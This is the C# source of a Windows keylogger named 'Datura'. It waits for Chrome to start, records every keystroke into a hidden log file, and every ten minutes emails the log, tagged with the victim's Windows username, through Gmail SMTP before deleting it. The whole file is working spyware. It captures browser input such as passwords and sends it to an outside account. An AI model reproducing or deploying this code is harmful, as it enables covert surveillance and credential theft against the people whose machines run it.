using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using Timer = System.Timers.Timer;


namespace Datura
{
    class Program
    {
        //Delay, used when no key is pressed to reduce cpu usage.
        const short Delay = 50;

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);
        private static StringBuilder key = new StringBuilder();

        static void Main(string[] args)
        {
            int chrome = 8;
             
            //loops until sees that chrome window is open and starts the keylogger
            while (chrome > 6)
            {
                var RunningProcessPaths = ProcessFileNameFinderClass.GetAllRunningProcessFilePaths();
                if (RunningProcessPaths.Contains("chrome.exe"))
                {
                    new Program().start();
                    chrome = 4;

                }
                else
                {
                    chrome = 7;
                    Task.Delay(2000).Wait();

                }


            }
        }
        private void start()
        {


            //creates the log file and sets it to be hidden
            string path = "log.txt";
            if (File.Exists(path)) File.SetAttributes(path, FileAttributes.Hidden);

            //timer for when file is sent its now at every 60 seconds
            Timer t = new Timer();
            t.Interval = 60000 * 10;
            t.Elapsed += email;
            t.AutoReset = true;
            t.Enabled = true;

            
            int keysCount = Enum.GetValues(typeof(Keys)).Length;//Get the number of avaible keys.

            while (true)
            {
                    for (int i = 0; i < keysCount; i++)//Loop for every key.
                        if (GetAsyncKeyState(i) == -32767)//Check if key is pressed.
                            key.Append(Enum.GetName(typeof(Keys), i));//Add key to keys.

                    //If no key is pressed then wait x milliseconds.
                    if (key.Length <= 0) Task.Delay(Delay).Wait();
                    else
                    {
                        //Key is pressed, continue.
                        //Ingenore LButton and RButton, these are mouse clicks.
                        if (key.Equals("LButton") || key.Equals("RButton")) { key.Clear(); continue; }

                        key.Replace("Enter", Environment.NewLine);//replaces enter with a new line
                        key.Replace("Space", " ");//replaces the space with a real space
                       
                        File.AppendAllText("log.txt", key.ToString());//writes the keys to a log file
                        File.SetAttributes(path, FileAttributes.Hidden);//sets attributes for finding the file
                        key.Clear();

                    }
               
               
            }
  
        }




        private void email(Object source, ElapsedEventArgs e)
        {

            //path for file
            string path = "log.txt";

            string date = DateTime.Now.ToString(@"dd\/MM h\:mm tt");
            try
            {

                //sending the file thru email
                MailMessage mail = new MailMessage();
                SmtpClient server = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("GMAIL");
                mail.To.Add("GMAIL");
                mail.Subject = "Log: " + WindowsIdentity.GetCurrent().Name + " time: " + date;

                //reading to content of file
                if (!File.Exists(path)) return;
                StreamReader r = new StreamReader(path);
                String content = r.ReadLine();
                r.Close();

                mail.Body = content;

                server.Port = 587;
                server.Credentials = new NetworkCredential("GMAIL", "PASS");
                server.EnableSsl = true;
                server.Send(mail);

                // deleting the file after
                File.Delete(path);
            }
            catch (Exception ex)
            {
                File.AppendAllText("error.txt", ex.ToString());
            }
        }
    }
}
